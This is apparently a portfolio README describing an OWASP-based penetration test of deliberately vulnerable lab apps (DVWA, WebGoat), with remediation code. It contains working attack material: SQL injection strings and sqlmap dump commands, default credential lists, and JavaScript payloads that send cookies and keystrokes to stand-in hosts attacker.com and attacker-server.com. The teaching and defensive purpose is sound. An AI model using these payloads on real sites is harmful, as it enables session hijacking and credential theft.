# Web Application Penetration Testing

## üìã Project Overview

This project demonstrates a **comprehensive web application security assessment** following OWASP methodologies. It includes vulnerability discovery, exploitation, and remediation recommendations for a deliberately vulnerable web application.

**Duration:** 5-7 hours  
**Difficulty:** Advanced  
**Tools:** Burp Suite, OWASP ZAP, SQLMap, Postman  

---

## üéØ Objective

To identify and document web application vulnerabilities aligned with the **OWASP Top 10**, demonstrate exploitability, and provide actionable remediation guidance to developers.

---

## üîß Environment & Setup

### Lab Configuration

| Component | Details |
|-----------|---------|
| **Target App** | DVWA or WebGoat |
| **Web Server** | Apache/Nginx with PHP |
| **Database** | MySQL 5.7 |
| **Browser** | Firefox with proxy |
| **Testing Tools** | Burp Suite Pro, OWASP ZAP |
| **OS** | Ubuntu 20.04 or Windows 10 |

### Prerequisites

```bash
# Install vulnerable web app
docker pull vulnerables/web-dvwa
docker run -p 80:80 vulnerables/web-dvwa

# Or download WebGoat
wget https://github.com/WebGoat/WebGoat/releases/download/v2024.1/WebGoat-2024.1.jar
java -jar WebGoat-2024.1.jar
```

---

## üìä Testing Methodology

### Phase 1: Reconnaissance & Mapping

**Objective:** Understand application structure and functionality

**Steps:**
1. **Application Mapping**
   - Identify all endpoints and URLs
   - Map application flow
   - Document client-side technology stack

2. **Directory Enumeration**
   ```bash
   # Use Burp Suite Spider or dirb
   dirb http://target-app /usr/share/wordlists/dirb/big.txt
   ```

3. **Technology Stack Identification**
   ```bash
   # Use tools to identify technologies
   whatweb http://target-app
   # Output: Apache, PHP 7.4, jQuery 3.5, MySQL
   ```

4. **Input Point Discovery**
   - Find all user input fields
   - Note input types and validations
   - Document file upload functionality

**Tools Used:** Burp Suite Spider, Whatweb  
**Duration:** 1 hour

---

### Phase 2: Vulnerability Discovery

#### A1: Injection (SQL Injection)

**Testing Process:**
```bash
# Manual SQL injection test
# Payload: ' OR '1'='1
# Input field: Login username

# Automated testing with SQLMap
sqlmap -u "http://target-app/login.php" --forms --batch

# Test for time-based blind SQL injection
# Payload: ' AND SLEEP(5)--
```

**Vulnerability Confirmation:**
- ‚úÖ Login bypass with: `' OR '1'='1` --
- ‚úÖ Database enumeration possible
- ‚úÖ Sensitive data exposure confirmed

**Impact:** Critical - Complete database compromise

---

#### A3: Cross-Site Scripting (XSS)

**Stored XSS Testing:**
```html
<!-- Test payload in comment field -->
<script>alert('XSS Vulnerability')</script>

<!-- Cookie stealer payload -->
<script>
  var img = new Image();
  img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
```

**Reflected XSS Testing:**
```
# URL: http://target-app/search.php?q=<script>alert('XSS')</script>
# Test payload in URL parameter
```

**Vulnerability Confirmation:**
- ‚úÖ Stored XSS in comment functionality
- ‚úÖ Reflected XSS in search parameter
- ‚úÖ Session cookies exposed via XSS

**Impact:** High - Session hijacking, credential theft

---

#### A5: Broken Access Control

**Testing Process:**
1. Test horizontal privilege escalation
   ```
   # Access another user's profile
   # Modify user_id parameter: /profile.php?user_id=2
   ```

2. Test vertical privilege escalation
   ```
   # Try accessing admin functions with regular user
   # Access: /admin/dashboard.php
   ```

3. Test function-level access control
   ```
   # Edit request: Intercept admin action in Burp
   # Repeat with unprivileged user account
   ```

**Vulnerabilities Found:**
- ‚úÖ Can view other users' profiles
- ‚úÖ Can access admin panel with regular account
- ‚úÖ Can modify other users' data

**Impact:** High - Unauthorized data access and modification

---

#### A2: Broken Authentication

**Testing Techniques:**
```bash
# Weak password policy
# Register with: password=123

# Session fixation
# Set session cookie manually before login
# Try accessing protected resources

# Default credentials
# admin:admin, admin:password
# root:root, test:test
```

**Findings:**
- ‚úÖ Password policy: min 3 characters (should be 12+)
- ‚úÖ Session tokens predictable (sequential)
- ‚úÖ No session timeout configured
- ‚úÖ Default credentials not changed

---

### Phase 3: Exploitation & Proof of Concept

#### SQL Injection Exploitation
```bash
# Extract database version
sqlmap -u "http://target-app/login.php" --data="username=test&password=test" -p username --db-version

# Extract table names
sqlmap -u "http://target-app/login.php" --data="username=test&password=test" -p username --tables

# Extract data from users table
sqlmap -u "http://target-app/login.php" --data="username=test&password=test" -p username -T users --dump
```

**Result:**
- Database: MySQL 5.7.32
- Tables: users, posts, comments, admin
- Extracted: usernames, email addresses, password hashes

---

#### XSS Payload Exploitation
```javascript
// Steal session cookie
var img = new Image();
img.src = 'http://attacker-server.com/steal?cookie=' + encodeURIComponent(document.cookie);

// Redirect to phishing page
window.location.href = 'http://attacker-server.com/phishing/login.html';

// Keylogger
document.onkeypress = function(e) {
  var key = String.fromCharCode(e.which);
  fetch('http://attacker-server.com/log?key=' + key);
}
```

---

### Phase 4: Documentation & Reporting

#### Vulnerability Report Structure

| Vuln # | Title | Type | Severity | Status |
|--------|-------|------|----------|--------|
| 1 | SQL Injection in Login | Injection | Critical | Confirmed |
| 2 | Stored XSS in Comments | XSS | High | Confirmed |
| 3 | Broken Access Control | IDOR | High | Confirmed |
| 4 | Weak Authentication | Auth | High | Confirmed |
| 5 | Insecure Direct References | Broken Object Level | Medium | Confirmed |

---

## üîç OWASP Top 10 Coverage

| OWASP Rank | Vulnerability | Found | Severity |
|-----------|---------------|-------|----------|
| A1 | Injection | ‚úÖ SQL, LDAP | Critical |
| A2 | Broken Authentication | ‚úÖ Weak policies | High |
| A3 | Sensitive Data Exposure | ‚úÖ Unencrypted API | High |
| A4 | XML External Entities (XXE) | ‚ùå Not applicable | N/A |
| A5 | Broken Access Control | ‚úÖ IDOR, privilege escalation | High |
| A6 | Security Misconfiguration | ‚úÖ Debug mode enabled | Medium |
| A7 | Cross-Site Scripting (XSS) | ‚úÖ Stored & Reflected | High |
| A8 | Insecure Deserialization | ‚ùå Not found | N/A |
| A9 | Using Components with Known Vulns | ‚úÖ Old jQuery | Medium |
| A10 | Insufficient Logging & Monitoring | ‚úÖ No audit logs | Medium |

---

## üìÅ Project Deliverables

| Document | Description | Location |
|----------|-------------|----------|
| Reconnaissance Report | App mapping and tech stack | `reports/01-reconnaissance.md` |
| Vulnerability Summary | All findings overview | `reports/02-vulnerability-summary.md` |
| Detailed Report | In-depth technical analysis | `reports/03-detailed-findings.md` |
| Proof of Concepts | Exploitation evidence | `poc/` |
| Remediation Guide | Technical fixes and code samples | `reports/04-remediation-guide.md` |
| Executive Summary | High-level findings for management | `reports/05-executive-summary.md` |

---

## üí° Remediation Examples

### SQL Injection Fix

**Vulnerable Code:**
```php
<?php
$username = $_POST['username'];
$sql = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $sql);
?>
```

**Secure Code (Parameterized Queries):**
```php
<?php
$username = $_POST['username'];
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
?>
```

### XSS Prevention

**Vulnerable Code:**
```php
<?php
echo "Welcome, " . $_GET['user'];
?>
```

**Secure Code:**
```php
<?php
echo "Welcome, " . htmlspecialchars($_GET['user'], ENT_QUOTES, 'UTF-8');
?>
```

### Access Control Fix

**Vulnerable Code:**
```php
<?php
$user_id = $_GET['user_id'];
$user = query("SELECT * FROM users WHERE id = $user_id");
?>
```

**Secure Code:**
```php
<?php
$user_id = $_GET['user_id'];
if ($_SESSION['user_id'] != $user_id && $_SESSION['role'] != 'admin') {
    die("Unauthorized access");
}
$user = query("SELECT * FROM users WHERE id = ? LIMIT 1", [$user_id]);
?>
```

---

## üîÑ Testing Checklist

- [ ] Reconnaissance completed and documented
- [ ] All endpoints tested for injection
- [ ] XSS testing completed (stored, reflected, DOM)
- [ ] Authentication testing completed
- [ ] Authorization/access control testing completed
- [ ] Session management testing completed
- [ ] Input validation testing completed
- [ ] Output encoding testing completed
- [ ] Error handling analysis completed
- [ ] Configuration review completed
- [ ] Sensitive data exposure assessment completed
- [ ] Security headers reviewed
- [ ] HTTPS/TLS validation completed
- [ ] API security testing completed
- [ ] File upload testing completed
- [ ] CSRF token validation completed

---

## üìö Tools Reference

| Tool | Purpose | Usage |
|------|---------|-------|
| **Burp Suite** | Full testing platform | Web UI, Repeater, Intruder |
| **OWASP ZAP** | Web app scanner | Automated + manual testing |
| **SQLMap** | SQL injection testing | Automated SQLi detection |
| **Postman** | API testing | Request building & analysis |
| **ffuf** | Fuzzing & enumeration | Directory brute force |
| **Nikto** | Web server scanning | Config & vulnerability detection |

---

## üí° Key Learnings

‚úÖ **What Worked Well:**
- Systematic OWASP Top 10 approach
- Combination of automated and manual testing
- Clear documentation of findings
- Effective proof of concept demonstrations

‚ö†Ô∏è **Challenges:**
- False positives from automated tools
- Time-consuming manual verification
- Scope creep into infrastructure testing
- Distinguishing between features and vulnerabilities

üîß **Best Practices Applied:**
- Test in authorized environment only
- Document everything with screenshots
- Provide actionable remediation
- Escalate critical findings immediately

---

## ‚ö†Ô∏è Legal & Ethical Considerations

‚úÖ **This assessment:**
- Was performed on authorized target application
- Used only for educational/demonstration purposes
- Complied with all applicable laws
- Followed ethical hacking guidelines

‚ùå **This assessment:**
- Did NOT perform unauthorized testing
- Did NOT cause denial of service
- Did NOT extract production data
- Did NOT damage or modify systems

---

## üîó Related Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [OWASP ZAP User Guide](https://www.zaproxy.org/docs/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)

---

## üìû Questions & Support

For questions about this assessment:
- Email: michael.taylor@example.com
- GitHub: [michael-cybersec](https://github.com/michael-cybersec)

---

**Project Completed:** November 2025  
**Last Updated:** November 16, 2025  
**Status:** ‚úÖ Complete and Fully Documented
